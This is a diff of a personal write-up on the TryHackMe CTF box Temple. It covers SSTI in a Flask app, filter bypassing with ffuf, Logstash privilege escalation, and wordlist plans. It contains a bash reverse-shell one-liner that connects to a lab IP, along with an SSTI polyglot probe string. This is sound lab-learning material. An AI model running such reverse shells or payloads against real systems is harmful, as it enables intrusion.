@@ -10,9 +10,14 @@ Goals:
 - Test Naabu 
 - Finish my other Beyond Roots that are THM machines [[Biblioteca-Helped-Through]], [[Agent-T-Writeup]]
 Learnt:
+- Bad character filtering with `ffuf` 
+- Patching is not that hard
+- Improving Web hacking and general methodology for filter evasion
+- Go Full Big Brain on wordlists 
 Beyond Root:
 - Patch a SSTI
 - Patch the Filter and try another bypass
+
 
 I really enjoy Al's streams. The communal atmosphere where I always learn something and have a laugh at the memes. It also makes the process of hacking machines more fun and real. I think watching Ippsec or reading write ups has some the hardship you face in hacking removed to make it relevant and accessible, but that does not normalise the malding it makes it a self centric phenomena that anomolous  to other when you are trying. I wanted to make sure I finished all my Beyond Roots of the last two boxes because of colds and what better way than one more box on the same site. [Alh4zr3d's Funday Sunday:Temple](https://www.youtube.com/watch?v=-NhqAaRfxEU&list=PLi4eaGO3umboaOqaot7Oi7WszkSWRc4Pi&index=11) interested me as I wanted to re-equant with Flask web apps, patch a SSTI for a Beyond Root. There is also container exploitation and web-filter bypassing and I need to research both as neither are common in encounted activities. 
 
@@ -90,7 +95,7 @@ Static website directory routing?
 User data is reflected on the page.
 ![](usernamereflectedonpage.png)
 
-How is authenicated user data reflected on the page?
+- How is authenicated user data reflected on the page?
 	- Framework? 
 	- Database?
 	- Session-related?
@@ -235,7 +240,7 @@ This would called and `curl` a reverse shell that is then executed by the piped 
 bash -c "bash -i >& /dev/tcp/10.9.1.132/4242 0>&1"`
 ```
 
-[Scarecrow/n1gh75hd3/mx9tff4hha7clo8mah](https://scarecrow.gitbook.io/ctfs-challenges-random-boxes/v/temple/#testing-for-ssti), write up was really great; sadly I  uses a Polygot `${{<%[%'"}}%\.` to test for SSTI. And unlike the box creator contain methodoly for enumeration. Similiarly there is a reate graph of deduction of SSTI to enumerate the framework. He fuzzed for bad characters as he went, which I generally have learnt from others and from other exploits that should be done before trying to exploit an application. 
+[Scarecrow/n1gh75hd3/mx9tff4hha7clo8mah](https://scarecrow.gitbook.io/ctfs-challenges-random-boxes/v/temple/#testing-for-ssti), write up was really great; sadly I  uses a Polygot `${{<%[%'"}}%\.` to test for SSTI. And unlike the box creator contain methodology for enumeration. Similiarly there is a reate graph of deduction of SSTI to enumerate the framework. He fuzzed for bad characters as he went, which I generally have learnt from others and from other exploits that should be done before trying to exploit an application. 
 
 Interestingly Scrarecrow tried to create accounts that would in sequence:
 - create an evil config file
@@ -330,8 +335,7 @@ New ssh shell
 
 ## PrivEsc
 
-
-Having not done the ELK rooms on [THM I did not know what Logstash](https://tryhackme.com/room/investigatingwithelk101, I did find it on pspsy.
+Having not done the ELK rooms on [THM I did not know what Logstash](https://tryhackme.com/room/investigatingwithelk101), I did find it on pspsy.
 ![](logstash.png)
 
 `adm` group can reads these logs; [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash) *"Logstash is used for collecting, transforming and outputting logs. This is realized by using **pipelines**, which contain input, filter and output modules. The service gets interesting when having compromised a machine which is running Logstash as a service."*
@@ -394,6 +398,14 @@ return render_template_string(template, username=username)
 Make a wordlists creator in golang for the serious string compute.
 
 OneSeclistDirectoryBustingWordlistToRuleTheCTFs
+
+- Go back to gobuster for inital directories
+- Stop, observe and note potential targets to start feroxbuster and ffuf from 
+	- What is actually a good target for this and what are likely middle directories that are good to recurse -  Pushing beyond the 
+		- Anything where
+			- dev, git, backup, bak
+- Use ffuf more ffuf vhosts, extensions, POTENTIAL pages
+- Do a slow set of feroxbusters scan over to collect and double verify 
 
 
 GSSF - GoSmokeSomeFilters.go - convert strings to filter evading strings. 
